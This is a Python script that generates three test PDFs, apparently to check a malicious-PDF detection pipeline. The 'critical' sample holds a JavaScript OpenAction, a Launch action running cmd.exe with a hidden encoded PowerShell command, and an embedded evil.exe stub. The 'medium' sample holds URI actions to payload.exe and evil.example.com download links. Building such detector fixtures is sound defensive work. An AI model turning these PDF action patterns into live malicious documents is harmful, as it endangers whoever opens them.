#!/usr/bin/env python3
"""
make_test_pdf.py
Generates test PDFs with embedded malicious indicators for pipeline testing.

Usage:
  python make_test_pdf.py                  # creates all 3 test PDFs in ~/Downloads
  python make_test_pdf.py /output/folder   # custom output folder
"""
import os
import sys

output_dir = sys.argv[1] if len(sys.argv) > 1 else str(os.path.expanduser("~/Downloads"))
os.makedirs(output_dir, exist_ok=True)


def write_pdf(path: str, content: str):
    with open(path, "wb") as f:
        f.write(content.encode("latin-1"))
    print(f"  ✓ Created: {path}")


# ── 1. CRITICAL — JS + OpenAction + EmbeddedFile + Launch ────────────────────
critical_pdf = """%PDF-1.6
1 0 obj
<< /Type /Catalog
   /OpenAction << /Type /Action /S /JavaScript /JS (eval(unescape('%75%72%6C')); shellcode();) >>
   /AA << /O << /S /Launch /Win << /F (cmd.exe) /P (/c powershell.exe -nop -w hidden -enc abc) >> >> >>
   /AcroForm << /XFA (malicious) >>
>>
endobj

2 0 obj
<< /Type /EmbeddedFile /Subtype /application#2Fx-msdownload >>
stream
MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff
endstream
endobj

3 0 obj
<< /Type /Filespec /F (evil.exe) /EF << /F 2 0 R >> >>
endobj

4 0 obj
<< /Type /Page /JS (String.fromCharCode(115,104,101,108,108)) >>
endobj

xref
0 5
0000000000 65535 f
0000000009 00000 n
0000000058 00000 n
0000000115 00000 n
0000000206 00000 n

trailer << /Size 5 /Root 1 0 R >>
startxref
300
%%EOF"""

# ── 2. MEDIUM — URI action + suspicious keywords only ────────────────────────
medium_pdf = """%PDF-1.4
1 0 obj
<< /Type /Catalog
   /OpenAction << /Type /Action /S /URI /URI (http://185.220.101.45/payload.exe) >>
>>
endobj

2 0 obj
<< /Type /Page
   /Annots [<< /Subtype /Link /A << /S /URI /URI (http://evil.example.com/drop) >> >>]
>>
endobj

xref
0 3
0000000000 65535 f
0000000009 00000 n
0000000058 00000 n

trailer << /Size 3 /Root 1 0 R >>
startxref
150
%%EOF"""

# ── 3. CLEAN — normal PDF with no indicators ─────────────────────────────────
clean_pdf = """%PDF-1.4
1 0 obj
<< /Type /Catalog /Pages 2 0 R >>
endobj

2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj

3 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792]
   /Contents 4 0 R /Resources << /Font << /F1 5 0 R >> >> >>
endobj

4 0 obj
<< /Length 44 >>
stream
BT /F1 12 Tf 100 700 Td (Hello, this is a clean PDF.) Tj ET
endstream
endobj

5 0 obj
<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>
endobj

xref
0 6
0000000000 65535 f
0000000009 00000 n
0000000058 00000 n
0000000115 00000 n
0000000266 00000 n
0000000360 00000 n

trailer << /Size 6 /Root 1 0 R >>
startxref
441
%%EOF"""

print(f"Generating test PDFs in: {output_dir}\n")
write_pdf(os.path.join(output_dir, "test_critical_malicious.pdf"), critical_pdf)
write_pdf(os.path.join(output_dir, "test_medium_suspicious.pdf"), medium_pdf)
write_pdf(os.path.join(output_dir, "test_clean_safe.pdf"), clean_pdf)

print("\nDone. Drop these into your watched folder to test the pipeline.")
print("Expected results:")
print("  test_critical_malicious.pdf  →  CRITICAL (JS + OpenAction + EmbeddedFile + Launch)")
print("  test_medium_suspicious.pdf   →  MEDIUM   (URI action + suspicious domain)")
print("  test_clean_safe.pdf          →  LOW      (no indicators)")
